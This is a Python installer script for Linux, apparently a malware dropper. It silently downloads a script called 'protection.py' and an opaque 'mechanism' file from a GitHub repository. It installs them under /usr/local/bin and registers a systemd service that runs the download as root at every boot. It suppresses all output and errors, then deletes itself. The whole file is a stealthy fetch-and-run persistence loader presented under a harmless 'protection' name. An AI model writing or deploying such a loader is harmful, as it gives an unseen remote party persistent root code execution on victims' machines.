#!/usr/bin/env python3

# This script is intended for Linux systems that uses systemd and cron

import os
import sys
import time
import subprocess

# Define URLs for downloading the necessary files
repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection3.py"
requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"


# Define the output file paths
envPath = "/usr/local/bin/protectionEnv"
pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
repoFilePath = "/usr/local/bin/protection.py"
requirementsFilePath = "/usr/local/bin/requirements.txt"
contentFilePath = "/usr/local/bin/mechanism"
serviceFilePath = "/etc/systemd/system/protection.service"

def install_pip_and_requests():
    try:
        # Check if pip is already installed
        try:
            subprocess.run([sys.executable, '-m', 'pip', '--version'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            # If pip is not installed, install pip
            subprocess.run([sys.executable, '-m', 'ensurepip', '--upgrade'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Install 'requests' using pip
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        return True
    except subprocess.CalledProcessError:
        return False
    except Exception:
        return False


# Function to create a virtual environment and install requests
def create_virtual_environment(env_path):
    try:
        # Create the virtual environment
        subprocess.run([sys.executable, '-m', 'venv', env_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Install 'requests' in the virtual environment
        pip_executable = os.path.join(env_path, 'bin', 'pip')
        subprocess.run([pip_executable, 'install', 'requests'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        return True
    except subprocess.CalledProcessError:
        return False
    except Exception:
        return False


# Function to use an existing virtual and install requirements
def setup_python_environment(env_path, requirements_path):
    try:
        # Check if the requirements file exists
        if not os.path.exists(requirements_path):
            return None

        # Install requirements
        pip_executable = os.path.join(env_path, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(env_path, 'bin', 'pip')
        subprocess.run([pip_executable, 'install', '-r', requirements_path], capture_output=False, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        return pip_executable  # Return pip path for service configuration if needed

    except Exception:
        return None

# Function to download a file and save it locally
def download_file(url, file_path):
    import requests
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
    except requests.exceptions.RequestException as e:
        pass


# Function to create a systemd service file (Linux only)
def create_service_file(service_file_path, python_path):
    service_content = f"""
[Unit]
Description=Protection Service
After=network.target

[Service]
ExecStart={python_path} /usr/local/bin/protection.py
WorkingDirectory=/usr/local/bin
Environment=PATH={os.path.dirname(python_path)}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
StandardOutput=journal
StandardError=journal
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
"""
    try:
        with open(service_file_path, 'w') as f:
            f.write(service_content)
    except Exception as e:
        pass

def execute_script():
    """
    Executes the protection.py script using the Python interpreter
    from the virtual environment.
    """
    try:
        result = subprocess.run([pythonPath, repoFilePath], capture_output=False, text=True)
        if result.stdout:
            pass
        if result.stderr:
            pass
    except Exception as e:
        pass



# Function to make script executable
def make_executable(file_path):
    try:
        os.chmod(file_path, 0o755)
    except Exception as e:
        pass

if __name__ == "__main__":
    global envPath

    # Download requests from pip first
    #import requests

    # Step 1: Setup virtual environment
    if not os.path.exists(envPath):
        create_virtual_environment(envPath)
    else:
        pass

    # Ensure environment is active
    virtual_env_python = os.path.join(envPath, 'bin', 'python3')
    if sys.prefix != envPath:

        # Re-run the script using the virtual environment's Python
        virtual_env_python = "/usr/local/bin/protectionEnv/bin/python3"
        if os.path.exists(virtual_env_python):
            subprocess.run([virtual_env_python] + sys.argv)

            import requests
        else:
            sys.exit(1)


    # Download the files
    download_file(repoUrl, repoFilePath)
    download_file(requirementsUrl, requirementsFilePath)
    download_file(contentUrl, contentFilePath)


    # Make the main script executable
    make_executable(repoFilePath)

    # Create the environment and install requirements
    pip_path = setup_python_environment(envPath, requirementsFilePath)

    # Create the service file if on Linux
    if pip_path and os.name != 'nt':  # Skip service creation on Windows
        python_executable = os.path.join(envPath, 'bin', 'python3')
        create_service_file(serviceFilePath, pythonPath)

    # Reload systemd to recognize the new service
    subprocess.run(['systemctl', 'daemon-reload'], check=True)

    # Enable the service to run at boot
    subprocess.run(['systemctl', 'enable', 'protection.service'], check=True)

    # Start the service immediately
    subprocess.run(['systemctl', 'start', 'protection.service'], check=True)

    # Get the full path of the script
    script_path = os.path.abspath(__file__)  

    # Optional: Add delay to ensure the script has finished executing
    time.sleep(1)  

    try:
        # Delete the script file
        os.remove(script_path)  
    except Exception as e:
        pass
